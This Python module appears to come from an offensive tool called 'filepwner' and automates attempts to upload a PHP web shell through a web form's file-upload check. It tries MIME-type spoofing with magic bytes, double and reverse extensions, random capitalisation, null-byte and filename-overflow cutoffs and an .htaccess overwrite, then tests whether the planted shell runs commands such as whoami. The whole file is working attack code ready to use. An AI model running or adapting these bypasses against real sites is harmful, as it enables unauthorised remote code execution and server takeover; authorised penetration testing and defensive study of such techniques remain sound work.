from filepwner import parse_request_file, upload, info, warning, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar, capitalise_random, generate_random_string
import config
import time
import random


def mimetype_spoofing(request_file, session, options, accepted_extensions):
    print()
    info("Mime type spoofing", spacing=False)
    print()

    
    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*2)
    
    for php_extension in config.extensions["php"]:
        for extension in accepted_extensions:
            mimetype = config.mimetypes[extension]
            with open(config.shell_path, 'rb') as file: file_data = file.read()

            file_extension = f".{php_extension}"
            file_name = generate_random_string(10) + file_extension
            message = f"{file_name}, {mimetype}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype, message)

            #with magic bytes
            file_data = config.magic_bytes[extension] + file_data
            message = f"{file_name}, {mimetype}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype, message)
    
    
def double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    
    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)

    for php_extension in config.extensions["php"]:
        for extension in accepted_extensions:
            mimetype_php = config.mimetypes["php"]
            mimetype_original = config.mimetypes[extension]
            with open(config.shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{extension}.{php_extension}"
            file_name = generate_random_string(10) + file_extension
            message = f"{file_name}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_php, message)

            #with original mimetype bytes
            message = f"{file_name}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)

            #with magic bytes and original mimetype
            file_data = config.magic_bytes[extension] + file_data
            message = f"{file_name}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)

def double_extension_random_case(request_file, session, options, accepted_extensions):
    print()
    info("Double extensions with random case", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    
    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)

    for php_extension in config.extensions["php"]:
        #capitalising random letters
        php_extension = capitalise_random(php_extension)

        for extension in accepted_extensions:
            mimetype_php = config.mimetypes["php"]
            mimetype_original = config.mimetypes[extension]
            with open(config.shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{extension}.{php_extension}"
            file_name = generate_random_string(10) + file_extension
            message = f"{file_name}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_php, message)

            #with original mimetype bytes
            message = f"{file_name}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)

            #with magic bytes and original mimetype
            file_data = config.magic_bytes[extension] + file_data
            message = f"{file_name}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message)



def reverse_double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Reverse double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    
    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*3)
    
    for php_extension in config.extensions["php"]:
        for extension in accepted_extensions:
            mimetype_php = config.mimetypes["php"]
            mimetype_original = config.mimetypes[extension]
            with open(config.shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{php_extension}.{extension}"
            file_name = generate_random_string(10) + file_extension
            message = f"{file_name}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_php, message, expect_interaction=False)

            #with original mimetype bytes
            message = f"{file_name}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False)

            #with magic bytes and original mimetype
            file_data = config.magic_bytes[extension] + file_data
            message = f"{file_name}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False)

def null_byte_cutoff(request_file, session, options, accepted_extensions):
    print()
    info("Null byte cutoff", spacing=False)
    print()

    #Too many iterations otherwise
    shortened_php_extension_list = config.extensions["php"][:4]

    content, headers, host, path = parse_request_file(request_file)
    
    set_progress_bar(len(shortened_php_extension_list)*len(accepted_extensions)*len(config.null_bytes)*3)
    
    for php_extension in shortened_php_extension_list:
        for extension in accepted_extensions:
            for null_byte in config.null_bytes:
                mimetype_php = config.mimetypes["php"]
                mimetype_original = config.mimetypes[extension]
                with open(config.shell_path, 'rb') as file: file_data = file.read()

                #with php mimetype
                file_extension = f".{php_extension}{null_byte}.{extension}"
                file_name = generate_random_string(10) + file_extension
                message = f"{file_name}, {mimetype_php}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_php, message, expect_interaction=False, real_extension=f".{php_extension}")

                #with original mimetype bytes
                message = f"{file_name}, {mimetype_original}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")

                #with magic bytes and original mimetype
                file_data = config.magic_bytes[extension] + file_data
                message = f"{file_name}, {mimetype_original}, magic bytes: ON"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")

def name_overflow_cutoff(request_file, session, options, accepted_extensions):
    print()
    info("Name overflow cutoff", spacing=False)
    print()

    overflow_lengths = [255, 236]

    content, headers, host, path = parse_request_file(request_file)
    
    set_progress_bar(len(config.extensions["php"])*len(accepted_extensions)*len(overflow_lengths)*3)
    
    for php_extension in config.extensions["php"]:
        for extension in accepted_extensions:
            for overflow_length in overflow_lengths:
                mimetype_php = config.mimetypes["php"]
                mimetype_original = config.mimetypes[extension]
                with open(config.shell_path, 'rb') as file: file_data = file.read()

                #with php mimetype
                file_extension = f".{php_extension}.{extension}"
                file_name = ("A" * (overflow_length - (len(php_extension) + 1))) + file_extension
                message = f"{file_name}, {mimetype_php}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_php, message, expect_interaction=False, real_extension=f".{php_extension}")

                #with original mimetype bytes
                message = f"{file_name}, {mimetype_original}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")

                #with magic bytes and original mimetype
                file_data = config.magic_bytes[extension] + file_data
                message = f"{file_name}, {mimetype_original}, magic bytes: ON"
                session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")

def htaccess_overwrite(request_file, session, options, accepted_extensions):
    print()
    info(".htaccess overwrite", spacing=False)
    print()

    set_progress_bar(len(accepted_extensions)*2)
    
    for extension in accepted_extensions:
        mimetype = config.mimetypes[extension]
        with open(config.shell_path, 'rb') as file: php_file_data = file.read()
        with open("assets/sample_files/.htaccess", 'rb') as file: file_data = file.read()

        php_file_extension = f".arbext"
        php_file_name = generate_random_string(10) + php_file_extension
        message = f"{php_file_name}, {mimetype}, php shell with arbirtrary extension"
        session, upload_status = upload_and_validate(request_file, session, php_file_data, php_file_name, mimetype, message, return_on_upload=True)
        if (upload_status == False):
            warning("The form doesn't seem to allow arbitrary file extensions, probably a blacklist")
            return

        file_extension = ".htaccess"
        file_name = file_extension
        message = f"{file_name}, {mimetype}"
        session, upload_status = upload_and_validate(request_file, session, file_data, file_name, mimetype, message, return_on_upload=True)
        if (upload_status == False):
            continue

        content, headers, host, path = parse_request_file(request_file)
        upload_url = f"{config.protocol}://{host}{options.upload_dir}"

        check_result = check_shell(upload_url + php_file_name, more_info=True)
        if (check_result == True):
            success("Shell confirmed interactable")
            exit_success(upload_url + php_file_name)
        else:
            debug((upload_url + php_file_name + "?test=whoami"), 0)
            if (check_result == "printed_out"):
                warning("Shell was printed as plain text")
            else:
                warning("Shell does not seem to be interractable, make sure your upload directory is correct")
                if (options.manual_check):
                    input("Manual check enabled, waiting for input...")

